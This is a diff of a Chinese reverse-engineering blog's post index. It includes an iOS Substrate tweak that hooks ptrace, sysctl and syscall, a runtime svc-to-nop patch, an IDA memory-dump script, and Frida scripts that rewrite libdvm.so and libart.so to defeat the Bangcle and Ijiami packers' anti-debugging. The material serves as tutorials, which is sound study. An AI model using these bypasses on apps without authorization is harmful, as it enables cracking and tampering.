class="string">"[AntiAntiDebug] - ptrace request is PT_DENY_ATTACH"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> orig_ptrace(request,pid,addr,data);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span>* (*orig_dlsym)(<span class="keyword">void</span>* handle, <span class="keyword">const</span> <span class="keyword">char</span>* symbol);</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">my_dlsym</span><span class="params">(<span class="keyword">void</span>* handle, <span class="keyword">const</span> <span class="keyword">char</span>* symbol)</span></span>&#123;</div><div class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(symbol, <span class="string">"ptrace"</span>) == <span class="number">0</span>)&#123;</div><div class="line">		NSLog(@<span class="string">"[AntiAntiDebug] - dlsym get ptrace symbol"</span>);</div><div class="line">		<span class="keyword">return</span> (<span class="keyword">void</span>*)my_ptrace;</div><div class="line">    &#125;</div><div class="line">   	<span class="keyword">return</span> orig_dlsym(handle, symbol);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_sysctl)</span><span class="params">(<span class="keyword">int</span> * name, u_int namelen, <span class="keyword">void</span> * info, <span class="keyword">size_t</span> * infosize, <span class="keyword">void</span> * newinfo, <span class="keyword">size_t</span> newinfosize)</span></span>;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_sysctl</span><span class="params">(<span class="keyword">int</span> * name, u_int namelen, <span class="keyword">void</span> * info, <span class="keyword">size_t</span> * infosize, <span class="keyword">void</span> * newinfo, <span class="keyword">size_t</span> newinfosize)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> ret = orig_sysctl(name,namelen,info,infosize,newinfo,newinfosize);</div><div class="line">	<span class="keyword">if</span>(namelen == <span class="number">4</span> &amp;&amp; name[<span class="number">0</span>] == <span class="number">1</span> &amp;&amp; name[<span class="number">1</span>] == <span class="number">14</span> &amp;&amp; name[<span class="number">2</span>] == <span class="number">1</span>)&#123;</div><div class="line">		<span class="keyword">struct</span> kinfo_proc *info_ptr = (<span class="keyword">struct</span> kinfo_proc *)info;</div><div class="line">        <span class="keyword">if</span>(info_ptr &amp;&amp; (info_ptr-&gt;kp_proc.p_flag &amp; P_TRACED) != <span class="number">0</span>)&#123;</div><div class="line">            NSLog(@<span class="string">"[AntiAntiDebug] - sysctl query trace status."</span>);</div><div class="line">            info_ptr-&gt;kp_proc.p_flag ^= P_TRACED;</div><div class="line">            <span class="keyword">if</span>((info_ptr-&gt;kp_proc.p_flag &amp; P_TRACED) == <span class="number">0</span>)&#123;</div><div class="line">                NSLog(@<span class="string">"[AntiAntiDebug] trace status reomve success!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ret;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span>* (*orig_syscall)(<span class="keyword">int</span> code, va_list args);</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">my_syscall</span><span class="params">(<span class="keyword">int</span> code, va_list args)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> request;</div><div class="line">    va_list newArgs;</div><div class="line">    va_copy(newArgs, args);</div><div class="line">    <span class="keyword">if</span>(code == <span class="number">26</span>)&#123;</div><div class="line">        request = (<span class="keyword">long</span>)args;</div><div class="line">        <span class="keyword">if</span>(request == <span class="number">31</span>)&#123;</div><div class="line">            NSLog(@<span class="string">"[AntiAntiDebug] - syscall call ptrace, and request is PT_DENY_ATTACH"</span>);</div><div class="line">            <span class="keyword">return</span> nil;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)orig_syscall(code, newArgs);</div><div class="line">&#125;</div><div class="line"></div><div class="line">%ctor&#123;</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)MSFindSymbol(<span class="literal">NULL</span>,<span class="string">"_ptrace"</span>),(<span class="keyword">void</span>*)my_ptrace,(<span class="keyword">void</span>**)&amp;orig_ptrace);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)dlsym,(<span class="keyword">void</span>*)my_dlsym,(<span class="keyword">void</span>**)&amp;orig_dlsym);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)sysctl,(<span class="keyword">void</span>*)my_sysctl,(<span class="keyword">void</span>**)&amp;orig_sysctl);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)syscall,(<span class="keyword">void</span>*)my_syscall,(<span class="keyword">void</span>**)&amp;orig_syscall);</div><div class="line"></div><div class="line">	NSLog(@<span class="string">"[AntiAntiDebug] Module loaded!!!"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging5.jpg" alt=""></p>
-<h1 id="svc内联反调试"><a href="#svc内联反调试" class="headerlink" title="svc内联反调试"></a>svc内联反调试</h1><p>所谓svc内联其实就是通过svc汇编实现对ptrace、syscall的调用，防止攻击者直接通过hook函数绕过反调试，增加反调试绕过难度。</p>
-<h2 id="如何确定iOS应用是否采用svc内联反调试"><a href="#如何确定iOS应用是否采用svc内联反调试" class="headerlink" title="如何确定iOS应用是否采用svc内联反调试"></a>如何确定iOS应用是否采用svc内联反调试</h2><p>调用svc实现ptrace的汇编如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="string">"mov X0, #31"</span></div><div class="line"><span class="string">"mov X1, #0"</span></div><div class="line"><span class="string">"mov X2, #0"</span></div><div class="line"><span class="string">"mov X3, #0"</span></div><div class="line"><span class="string">"mov w16, #26"</span></div><div class="line"><span class="string">"svc #0x80"</span></div></pre></td></tr></table></figure></p>
-<p>调用svc通过syscall实现ptrace的汇编如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="string">"mov X0, #26"</span></div><div class="line">   <span class="string">"mov X1, #31"</span></div><div class="line">   <span class="string">"mov X2, #0"</span></div><div class="line">   <span class="string">"mov X3, #0"</span></div><div class="line">   <span class="string">"mov X4, #0"</span></div><div class="line">   <span class="string">"mov w16, #0"</span></div><div class="line">   <span class="string">"svc #0x80"</span></div></pre></td></tr></table></figure></p>
-<p>在动态调试iOS过程中如果遇到下面情况：<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging2.jpg" alt=""></p>
-<p>二话不说先祭出上文的那个hook插件，如果插件不好使，直接通过IDA分析主程序在全局搜索SVC 0x80，当然也有可能不在主程序中，dylib中也是有可能的。不巧的是我在主程序中搜到了。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging7.jpg" alt=""></p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging1.jpg" alt=""></p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging6.jpg" alt=""></p>
-<h2 id="绕过svc反调试"><a href="#绕过svc反调试" class="headerlink" title="绕过svc反调试"></a>绕过svc反调试</h2><p>在找的这两段代码之后，想起大佬们说过遇到SVC 0x80无脑nop就好了，但是在静态情况下nop之后放入运行时程序中或者重打包安装都并不好使怎么办，不要慌，经过本人多次尝试百试百灵的办法来了。</p>
-<p>反调试检测必然是在程序启动初始化的过程中，这里采取一个取巧的办法，在手机点开应用的瞬间，通过debugserver挂载该APP</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging4.jpg" alt=""></p>
-<p>之后在上面找到的地址下断点，通过memory write address 0x1f 0x20 0x03 0xd5将svc指令修改为nop，将SYS_ptrace和SYS_syscall都修改完成后，删除断点，c运行发现反调试以及绕过了。</p>
-<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging3.jpg" alt=""></p>
+    <title>xortool的安装使用</title>
+    <url>/2016/10/05/xortool%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>Xortool.py是一款基于python的脚本，用来完成一些xor分析。<br><a id="more"></a></p>
+<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><ul>
+<li>猜想key的长度</li>
+<li>猜想key的值</li>
+<li><p>解密一些经过xoe加密的文件</p>
+<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><p>xortool依赖于python的命令行参数解释器docopt。</p>
+<p>  $ sudo pip install docopt<br>Then install xortool:</p>
+<p>  $ cd /data/src/<br>  $ git clone <a href="https://github.com/hellman/xortool.git" target="_blank" rel="external">https://github.com/hellman/xortool.git</a><br>  $ cd xortool/<br>  $ sudo python setup.py install</p>
+<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2></li>
+</ul>
+<h3 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h3><pre><code>-l,--key-length
+    length of the key (integer)
+-c,--char
+    most possible char (one char or hex code)
+-m,--max-keylen=32
+    maximum key length to probe (integer)
+-x,--hex
+    input is hex-encoded str
+-b,--brute-chars
+    brute force all possible characters
+-o,--brute-printable
+    same as -b but will only use printable characters for keys
+</code></pre><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>详细功能参见<br><img src="https://www.aldeid.com/wiki/Xortool" alt="官方说明"><br>这里和大家分享一个解密文件的功能，在xortool里有一个名为xortool-xor的文件，它可以将xor加密的文件解密。</p>
+<p>有一个加密的文件为flag.encrypted,异或加密的密钥是dc647eb65e6711e155375218212b3964，</p>
+<p><img src="http://i1.piimg.com/567571/6931a5b710e21777.png" alt=""></p>
+<p>这样就解密了。。。</p>
 ]]></content>
       <tags>
-        <tag>iOS</tag>
-        <tag>反调试</tag>
-        <tag>反反调试</tag>
+        <tag>工具</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -3428,6 +3291,33 @@ print(flag)
       </tags>
   </entry>
   <entry>
+    <title>动态绕过iOS内联svc反调试</title>
+    <url>/2020/04/30/%E5%8A%A8%E6%80%81%E7%BB%95%E8%BF%87iOS%E5%86%85%E8%81%94svc%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
+    <content><![CDATA[<p>之前在jmpews大神的<a href="http://bbs.iosre.com/t/topic/9351&quot;With a Title&quot;" target="_blank" rel="external">反调试与绕过的奇淫技巧</a>以及AloneMonkey大神的<a href="http://bbs.iosre.com/t/topic/8179" target="_blank" rel="external">关于反调试&amp;反反调试那些事</a>这两篇文章中学习到不少关于iOS反调试绕过的姿势技巧，本篇主要记录一下自己在实际逆向过程中遇到的关于svc内联反调试的绕过过程。<br><a id="more"></a></p>
+<h1 id="iOS反调试简介"><a href="#iOS反调试简介" class="headerlink" title="iOS反调试简介"></a>iOS反调试简介</h1><p>iOS的反调试目前常见只有几种，主要是ptrace、sysctl、syscall几种，这里我就不照本宣科的去介绍这几种反调试的原理了，我上面提到的两位大神的文章中有十分详细的说明。</p>
+<p>由于以上三种方式的反调试相对比较容易绕过，一般通过Tweak编写hook插件就可以解决了，下面贴上AloneMonkey的一个脚本，足以绕过这些反调试<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;sys/sysctl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_ptrace)</span> <span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">caddr_t</span> addr, <span class="keyword">int</span> data)</span></span>;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_ptrace</span> <span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">caddr_t</span> addr, <span class="keyword">int</span> data)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(request == <span class="number">31</span>)&#123;</div><div class="line">		NSLog(@<span class="string">"[AntiAntiDebug] - ptrace request is PT_DENY_ATTACH"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> orig_ptrace(request,pid,addr,data);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span>* (*orig_dlsym)(<span class="keyword">void</span>* handle, <span class="keyword">const</span> <span class="keyword">char</span>* symbol);</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">my_dlsym</span><span class="params">(<span class="keyword">void</span>* handle, <span class="keyword">const</span> <span class="keyword">char</span>* symbol)</span></span>&#123;</div><div class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(symbol, <span class="string">"ptrace"</span>) == <span class="number">0</span>)&#123;</div><div class="line">		NSLog(@<span class="string">"[AntiAntiDebug] - dlsym get ptrace symbol"</span>);</div><div class="line">		<span class="keyword">return</span> (<span class="keyword">void</span>*)my_ptrace;</div><div class="line">    &#125;</div><div class="line">   	<span class="keyword">return</span> orig_dlsym(handle, symbol);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_sysctl)</span><span class="params">(<span class="keyword">int</span> * name, u_int namelen, <span class="keyword">void</span> * info, <span class="keyword">size_t</span> * infosize, <span class="keyword">void</span> * newinfo, <span class="keyword">size_t</span> newinfosize)</span></span>;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_sysctl</span><span class="params">(<span class="keyword">int</span> * name, u_int namelen, <span class="keyword">void</span> * info, <span class="keyword">size_t</span> * infosize, <span class="keyword">void</span> * newinfo, <span class="keyword">size_t</span> newinfosize)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> ret = orig_sysctl(name,namelen,info,infosize,newinfo,newinfosize);</div><div class="line">	<span class="keyword">if</span>(namelen == <span class="number">4</span> &amp;&amp; name[<span class="number">0</span>] == <span class="number">1</span> &amp;&amp; name[<span class="number">1</span>] == <span class="number">14</span> &amp;&amp; name[<span class="number">2</span>] == <span class="number">1</span>)&#123;</div><div class="line">		<span class="keyword">struct</span> kinfo_proc *info_ptr = (<span class="keyword">struct</span> kinfo_proc *)info;</div><div class="line">        <span class="keyword">if</span>(info_ptr &amp;&amp; (info_ptr-&gt;kp_proc.p_flag &amp; P_TRACED) != <span class="number">0</span>)&#123;</div><div class="line">            NSLog(@<span class="string">"[AntiAntiDebug] - sysctl query trace status."</span>);</div><div class="line">            info_ptr-&gt;kp_proc.p_flag ^= P_TRACED;</div><div class="line">            <span class="keyword">if</span>((info_ptr-&gt;kp_proc.p_flag &amp; P_TRACED) == <span class="number">0</span>)&#123;</div><div class="line">                NSLog(@<span class="string">"[AntiAntiDebug] trace status reomve success!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ret;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span>* (*orig_syscall)(<span class="keyword">int</span> code, va_list args);</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">my_syscall</span><span class="params">(<span class="keyword">int</span> code, va_list args)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> request;</div><div class="line">    va_list newArgs;</div><div class="line">    va_copy(newArgs, args);</div><div class="line">    <span class="keyword">if</span>(code == <span class="number">26</span>)&#123;</div><div class="line">        request = (<span class="keyword">long</span>)args;</div><div class="line">        <span class="keyword">if</span>(request == <span class="number">31</span>)&#123;</div><div class="line">            NSLog(@<span class="string">"[AntiAntiDebug] - syscall call ptrace, and request is PT_DENY_ATTACH"</span>);</div><div class="line">            <span class="keyword">return</span> nil;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)orig_syscall(code, newArgs);</div><div class="line">&#125;</div><div class="line"></div><div class="line">%ctor&#123;</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)MSFindSymbol(<span class="literal">NULL</span>,<span class="string">"_ptrace"</span>),(<span class="keyword">void</span>*)my_ptrace,(<span class="keyword">void</span>**)&amp;orig_ptrace);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)dlsym,(<span class="keyword">void</span>*)my_dlsym,(<span class="keyword">void</span>**)&amp;orig_dlsym);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)sysctl,(<span class="keyword">void</span>*)my_sysctl,(<span class="keyword">void</span>**)&amp;orig_sysctl);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)syscall,(<span class="keyword">void</span>*)my_syscall,(<span class="keyword">void</span>**)&amp;orig_syscall);</div><div class="line"></div><div class="line">	NSLog(@<span class="string">"[AntiAntiDebug] Module loaded!!!"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging5.jpg" alt=""></p>
+<h1 id="svc内联反调试"><a href="#svc内联反调试" class="headerlink" title="svc内联反调试"></a>svc内联反调试</h1><p>所谓svc内联其实就是通过svc汇编实现对ptrace、syscall的调用，防止攻击者直接通过hook函数绕过反调试，增加反调试绕过难度。</p>
+<h2 id="如何确定iOS应用是否采用svc内联反调试"><a href="#如何确定iOS应用是否采用svc内联反调试" class="headerlink" title="如何确定iOS应用是否采用svc内联反调试"></a>如何确定iOS应用是否采用svc内联反调试</h2><p>调用svc实现ptrace的汇编如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="string">"mov X0, #31"</span></div><div class="line"><span class="string">"mov X1, #0"</span></div><div class="line"><span class="string">"mov X2, #0"</span></div><div class="line"><span class="string">"mov X3, #0"</span></div><div class="line"><span class="string">"mov w16, #26"</span></div><div class="line"><span class="string">"svc #0x80"</span></div></pre></td></tr></table></figure></p>
+<p>调用svc通过syscall实现ptrace的汇编如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="string">"mov X0, #26"</span></div><div class="line">   <span class="string">"mov X1, #31"</span></div><div class="line">   <span class="string">"mov X2, #0"</span></div><div class="line">   <span class="string">"mov X3, #0"</span></div><div class="line">   <span class="string">"mov X4, #0"</span></div><div class="line">   <span class="string">"mov w16, #0"</span></div><div class="line">   <span class="string">"svc #0x80"</span></div></pre></td></tr></table></figure></p>
+<p>在动态调试iOS过程中如果遇到下面情况：<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging2.jpg" alt=""></p>
+<p>二话不说先祭出上文的那个hook插件，如果插件不好使，直接通过IDA分析主程序在全局搜索SVC 0x80，当然也有可能不在主程序中，dylib中也是有可能的。不巧的是我在主程序中搜到了。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging7.jpg" alt=""></p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging1.jpg" alt=""></p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging6.jpg" alt=""></p>
+<h2 id="绕过svc反调试"><a href="#绕过svc反调试" class="headerlink" title="绕过svc反调试"></a>绕过svc反调试</h2><p>在找的这两段代码之后，想起大佬们说过遇到SVC 0x80无脑nop就好了，但是在静态情况下nop之后放入运行时程序中或者重打包安装都并不好使怎么办，不要慌，经过本人多次尝试百试百灵的办法来了。</p>
+<p>反调试检测必然是在程序启动初始化的过程中，这里采取一个取巧的办法，在手机点开应用的瞬间，通过debugserver挂载该APP</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging4.jpg" alt=""></p>
+<p>之后在上面找到的地址下断点，通过memory write address 0x1f 0x20 0x03 0xd5将svc指令修改为nop，将SYS_ptrace和SYS_syscall都修改完成后，删除断点，c运行发现反调试以及绕过了。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging3.jpg" alt=""></p>
+]]></content>
+      <tags>
+        <tag>iOS</tag>
+        <tag>反调试</tag>
+        <tag>反反调试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>延迟绑定技术原理</title>
     <url>/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</url>
     <content><![CDATA[<p>动态链接比静态链接灵活，但牺牲了性能，据统计ELF程序在静态链接下比动态库快大约1%~5%。<br><a id="more"></a><br>主要原因是，动态链接下对于全局和静态数据的访问都要进行复杂的GOT定位，然后间接寻址，对于模块间的调用也要先定位GOT，然后进行间接跳转。<br>另外，动态链接的链接过程是在运行时完成的，动态链接器会寻找并转载所需要的对象，然后进行符号查找地址重定位等工作。</p>
@@ -3486,6 +3376,46 @@ OFFSET   TYPE              VALUE
 ]]></content>
       <tags>
         <tag>System</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>梆梆&amp;爱加密java反调试绕过</title>
+    <url>/2020/05/19/%E6%A2%86%E6%A2%86-%E7%88%B1%E5%8A%A0%E5%AF%86java%E5%8F%8D%E8%B0%83%E8%AF%95%E7%BB%95%E8%BF%87/</url>
+    <content><![CDATA[<p>各位道友有没有在越过重重native反调试脱掉壳之后想要调试smali的过程中突然发现在使用AndroidStdio动态调试smali的时候只要一挂载APP就会崩溃，本篇主要整理一下在调试梆梆&amp;爱加密过程中遇到的java层反调试以及绕过的方式<br><a id="more"></a></p>
+<p>在将梆梆&amp;爱加密脱壳之后通过AS调试APP遇到反调试挂载失败，只要debug便会杀掉APP进程</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug9.png" alt=""></p>
+<h1 id="Dalvik虚拟机下的反调试绕过"><a href="#Dalvik虚拟机下的反调试绕过" class="headerlink" title="Dalvik虚拟机下的反调试绕过"></a>Dalvik虚拟机下的反调试绕过</h1><p>虽然Dalvik已经在逐步退出市场，但是这里还是由他开始，大家都知道Dalvik的核心库是libdvm.so，在调试的过程中与APP建立连接少不了对libdvm.so的引用，因此libdvm.so几乎是最有嫌疑的地方。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug.jpg" alt=""></p>
+<h2 id="获取libdvm-so"><a href="#获取libdvm-so" class="headerlink" title="获取libdvm.so"></a>获取libdvm.so</h2><p>所谓获取libdvm.so需要获取APP未启动时libdvm.so源文件，这里只要去/system/lib目录下将其提取到本地即可。<br>其次需要加固APP运行时libdvm.so，这里我通过IDA动态挂载APP之后将其从内存中dump出来。</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">auto</span> fp, begin, end, dexbyte;</div><div class="line">  fp = fopen(<span class="string">"D:\\dump.so"</span>, <span class="string">"wb"</span>);</div><div class="line">  begin = <span class="number">0x786A0000</span>;</div><div class="line">  end = begin + <span class="number">0x67000</span> ;</div><div class="line">  <span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )</div><div class="line">      fputc(Byte(dexbyte), fp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>小小脚本，不成敬意</p>
+<h2 id="比较libdvm-so"><a href="#比较libdvm-so" class="headerlink" title="比较libdvm.so"></a>比较libdvm.so</h2><p>在获取到两个libdvm.so之后通过BeyondCompare进行比较</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug5.png" alt=""></p>
+<p>通过比较可以看出在加固的APP运行之后，libdvm.so被改了几部分数据，并不是所有不同的地方都和反调试有关，通过IDA对照便宜去看看都改了什么地方，最终发现与java调试相关的地址为0x423B0，当然其他地方也有一些小惊喜，比如梆梆&amp;爱加密抽取函数所hook的函数什么的。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug2.png" alt=""></p>
+<p>_Z12dvmDbgActivev是java调试相关函数，主要功能是啥我也不是很清楚，有清楚的大佬希望可以留言告知一下，万分感谢。</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug7.jpg" alt=""></p>
+<p>由此可见加固APP是通过hook _Z12dvmDbgActivev函数使其跳转到它自己构造的函数，并且在其中将进程kill掉防止调试。那么我们只要将Hook之后的libdvm.so再Hook修改为原函数，让其正常运行_Z12dvmDbgActivev函数，就可以绕过反调试了。</p>
+<h2 id="Hook-libdvm-so"><a href="#Hook-libdvm-so" class="headerlink" title="Hook libdvm.so"></a>Hook libdvm.so</h2><p>这里通过frida hook _Z12dvmDbgActivev函数地址，打印内存，将原本函数正确内存数据写入对应地址中</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> frida</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></div><div class="line">    print(message)</div><div class="line"></div><div class="line">redv = frida.get_remote_device()</div><div class="line">session = redv.attach(<span class="string">"com.sf.activity"</span>)</div><div class="line"></div><div class="line">src = <span class="string">"""</span></div><div class="line">    var jnibind1 = undefined;</div><div class="line">    var jnibind2 = undefined;</div><div class="line">    var jnibind3 = undefined;</div><div class="line">    var jnibind4 = undefined;</div><div class="line">    var jnibind5 = undefined;</div><div class="line">    var jnibind6 = undefined;</div><div class="line">    var jnibind7 = undefined;</div><div class="line">    var f = Module.findBaseAddress("libdvm.so");</div><div class="line">    console.log("address: " + f);</div><div class="line">    jnibind1 = f.add(0x000423C0);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">    var vArray = [0x0D,0x4B,0x0E,0x4A,0x7B,0x44,0x10,0xB5,0x9C,0x58,0x94,0xF8,0xC6,0x33];</div><div class="line">    Memory.writeByteArray(p1P, vArray);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">        </div><div class="line">"""</div><div class="line">script = session.create_script(src)</div><div class="line">script.on(<span class="string">"message"</span>, on_message)</div><div class="line">script.load()</div><div class="line">sys.stdin.read()</div></pre></td></tr></table></figure>
+<p>frida hook之后结果</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug10.png" alt=""></p>
+<p>反调试已经绕过啦！！！</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug8.png" alt=""></p>
+<h1 id="Art虚拟机下的反调试绕过"><a href="#Art虚拟机下的反调试绕过" class="headerlink" title="Art虚拟机下的反调试绕过"></a>Art虚拟机下的反调试绕过</h1><h2 id="获取libart-so"><a href="#获取libart-so" class="headerlink" title="获取libart.so"></a>获取libart.so</h2><p>art虚拟机下的反调试绕过同上述的dalvik方法相同，只是关键的运行库libdvm.so替换为libart.so,同样要去/system/lib目录下将其提取到本地，这里需要注意的是在提取之前要确认运行的是libart.so还是libart64.so。</p>
+<h2 id="比较libart-so"><a href="#比较libart-so" class="headerlink" title="比较libart.so"></a>比较libart.so</h2><p>在获取到两个libart.so之后通过BeyondCompare进行比较</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug6.png" alt=""></p>
+<p>最终确认反调试Hook地址为0x10ABC4</p>
+<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug4.png" alt=""></p>
+<p>_ZN3art3Dbg8GoActiveEv函数功能同Dalvik中_Z12dvmDbgActivev函数功能类似，绕过方法与Dalvik保持一致。</p>
+<h2 id="Hook-libart-so"><a href="#Hook-libart-so" class="headerlink" title="Hook libart.so"></a>Hook libart.so</h2><p>这里通过frida hook _ZN3art3Dbg8GoActiveEv函数地址，打印内存，将原本函数正确内存数据写入对应地址中</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> frida</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></div><div class="line">    print(message)</div><div class="line"></div><div class="line">redv = frida.get_remote_device()</div><div class="line">session = redv.attach(<span class="string">"com.sf.activity"</span>)</div><div class="line"></div><div class="line">src = <span class="string">"""</span></div><div class="line">    var jnibind1 = undefined;</div><div class="line">    var jnibind2 = undefined;</div><div class="line">    var jnibind3 = undefined;</div><div class="line">    var jnibind4 = undefined;</div><div class="line">    var jnibind5 = undefined;</div><div class="line">    var jnibind6 = undefined;</div><div class="line">    var jnibind7 = undefined;</div><div class="line">    var f = Module.findBaseAddress("libart.so");</div><div class="line">    console.log("address: " + f);</div><div class="line">    jnibind1 = f.add(0x00115BC4);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">    var vArray = [0x2D, 0xE9, 0xF0, 0x4F, 0x9B, 0xB0, 0xDF, 0xF8, 0xBC, 0x0D, 0xDF, 0xF8, 0xBC, 0x1D];</div><div class="line">    Memory.writeByteArray(p1P, vArray);</div><div class="line">    var p1P = new 